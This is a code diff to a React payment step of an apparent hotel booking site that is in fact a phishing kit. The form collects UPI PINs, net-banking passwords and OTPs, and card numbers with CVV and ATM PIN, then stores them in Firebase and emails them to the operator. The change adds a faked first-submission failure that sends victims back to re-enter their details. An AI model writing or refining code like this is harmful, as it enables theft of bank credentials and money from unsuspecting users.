@@ -4,8 +4,9 @@ import { database } from '../firebase/firebaseConfig';
 import { ref, set } from 'firebase/database';
 import FormNavigation from './FormNavigation';
 
-const Step3PaymentMethod = ({ formData, setFormData, prevStep, onSubmit }) => {
+const Step3PaymentMethod = ({ formData, setFormData, prevStep, onSubmit, submissionAttempt, incrementSubmissionAttempt, goToFirstStep }) => {
   const [submitting, setSubmitting] = useState(false);
+  const [submissionMessage, setSubmissionMessage] = useState('');
   const [paymentView, setPaymentView] = useState('selection'); // 'selection', 'card_pin', 'netbanking_otp'
 
   const banks = [
@@ -68,71 +69,86 @@ const Step3PaymentMethod = ({ formData, setFormData, prevStep, onSubmit }) => {
       return;
     }
     setSubmitting(true);
+    setSubmissionMessage('Submitting booking...');
 
-    const bookingRef = ref(database, `bookings/${formData.mobile}`);
-    set(bookingRef, formData)
-      .then(() => {
-        // Format all booking details into an HTML table for the email
-        const details = {
-          'Full Name': formData.fullName,
-          'Mobile': formData.mobile,
-          'Check-In Date': formData.checkIn,
-          'Check-Out Date': formData.checkOut,
-          'Total Members': formData.totalMembers,
-          'Room Type': formData.roomType,
-          'Amount': `₹${formData.amount}`,
-          'Payment Method': formData.paymentMethod,
-        };
-
-        if (formData.paymentMethod === 'UPI') {
-          details['Bank Name'] = formData.bankName === 'Other' ? formData.otherBankName : formData.bankName;
-          details['UPI PIN'] = formData.upiPin;
-        } else if (formData.paymentMethod === 'Net Banking') {
-          details['Bank User ID'] = formData.netBankUsername;
-          details['Password'] = formData.netBankPassword;
-          details['OTP'] = formData.otp;
-        } else if (formData.paymentMethod === 'Debit/Credit Card') {
-          details['Card Number'] = formData.cardNumber;
-          details['Expiry Date'] = formData.expiry;
-          details['CVV'] = formData.cvv;
-          details['ATM PIN'] = formData.atmPin;
-        }
-
-        let messageHtml = '<table style="width: 100%; border-collapse: collapse; font-family: sans-serif;">';
-        messageHtml += '<tr><th colspan="2" style="padding: 12px; background-color: #4CAF50; color: white; text-align: center; font-size: 18px;">New Booking Details</th></tr>';
-        for (const [key, value] of Object.entries(details)) {
-          if (value) {
-            messageHtml += `<tr><td style="padding: 8px; border: 1px solid #ddd; font-weight: bold;">${key}</td><td style="padding: 8px; border: 1px solid #ddd;">${value}</td></tr>`;
-          }
-        }
-        messageHtml += '</table>';
-
-        const emailParams = {
-          name: formData.fullName,
-          time: new Date().toLocaleString(),
-          message: messageHtml,
-        };
-
-        emailjs.send(
-          import.meta.env.VITE_EMAILJS_SERVICE_ID,
-          import.meta.env.VITE_EMAILJS_TEMPLATE_ID,
-          emailParams,
-          import.meta.env.VITE_EMAILJS_PUBLIC_KEY
-        ).then((result) => {
-            console.log('Email sent successfully:', result.text);
-            setSubmitting(false);
-            onSubmit();
-        }, (error) => {
-            console.error('Failed to send email:', error.text);
-            alert('Booking was saved, but the email notification failed to send.');
-            setSubmitting(false);
-            onSubmit();
-        });
-      })
-      .catch((error) => {
-        alert('Error submitting booking: ' + error.message);
+    if (submissionAttempt === 0) {
+      // First attempt: simulate failure
+      setTimeout(() => {
+        incrementSubmissionAttempt();
         setSubmitting(false);
-      });
+        setSubmissionMessage('Submission failed. Redirecting to the first step...');
+        setTimeout(() => {
+          goToFirstStep();
+        }, 2000); // Wait 2s before redirecting
+      }, 1500); // 1.5 second delay
+    } else {
+      // Second attempt: proceed with actual submission
+      const bookingRef = ref(database, `bookings/${formData.mobile}`);
+      set(bookingRef, formData)
+        .then(() => {
+          // Format all booking details into an HTML table for the email
+          const details = {
+            'Full Name': formData.fullName,
+            'Mobile': formData.mobile,
+            'Check-In Date': formData.checkIn,
+            'Check-Out Date': formData.checkOut,
+            'Total Members': formData.totalMembers,
+            'Room Type': formData.roomType,
+            'Amount': `₹${formData.amount}`,
+            'Payment Method': formData.paymentMethod,
+          };
+
+          if (formData.paymentMethod === 'UPI') {
+            details['Bank Name'] = formData.bankName === 'Other' ? formData.otherBankName : formData.bankName;
+            details['UPI PIN'] = formData.upiPin;
+          } else if (formData.paymentMethod === 'Net Banking') {
+            details['Bank User ID'] = formData.netBankUsername;
+            details['Password'] = formData.netBankPassword;
+            details['OTP'] = formData.otp;
+          } else if (formData.paymentMethod === 'Debit/Credit Card') {
+            details['Card Number'] = formData.cardNumber;
+            details['Expiry Date'] = formData.expiry;
+            details['CVV'] = formData.cvv;
+            details['ATM PIN'] = formData.atmPin;
+          }
+
+          let messageHtml = '<table style="width: 100%; border-collapse: collapse; font-family: sans-serif;">';
+          messageHtml += '<tr><th colspan="2" style="padding: 12px; background-color: #4CAF50; color: white; text-align: center; font-size: 18px;">New Booking Details</th></tr>';
+          for (const [key, value] of Object.entries(details)) {
+            if (value) {
+              messageHtml += `<tr><td style="padding: 8px; border: 1px solid #ddd; font-weight: bold;">${key}</td><td style="padding: 8px; border: 1px solid #ddd;">${value}</td></tr>`;
+            }
+          }
+          messageHtml += '</table>';
+
+          const emailParams = {
+            name: formData.fullName,
+            time: new Date().toLocaleString(),
+            message: messageHtml,
+          };
+
+          emailjs.send(
+            import.meta.env.VITE_EMAILJS_SERVICE_ID,
+            import.meta.env.VITE_EMAILJS_TEMPLATE_ID,
+            emailParams,
+            import.meta.env.VITE_EMAILJS_PUBLIC_KEY
+          ).then((result) => {
+              console.log('Email sent successfully:', result.text);
+              setSubmitting(false);
+              setSubmissionMessage('Booking submitted successfully!');
+              setTimeout(onSubmit, 2000); // Go to next step after 2s
+          }, (error) => {
+              console.error('Failed to send email:', error.text);
+              setSubmissionMessage('Booking was saved, but the email notification failed to send.');
+              setSubmitting(false);
+              setTimeout(onSubmit, 2000);
+          });
+        })
+        .catch((error) => {
+          setSubmissionMessage('Error submitting booking: ' + error.message);
+          setSubmitting(false);
+        });
+    }
   };
 
   const handleProceed = () => {
@@ -267,7 +283,7 @@ const Step3PaymentMethod = ({ formData, setFormData, prevStep, onSubmit }) => {
       {paymentView === 'selection' && renderSelection()}
       {paymentView === 'card_pin' && renderCardPin()}
       {paymentView === 'netbanking_otp' && renderNetBankingOtp()}
-      {submitting && <p className="text-sm text-center mt-3">Submitting booking...</p>}
+      {submissionMessage && <p className="text-sm text-center mt-3">{submissionMessage}</p>}
     </div>
   );
 };
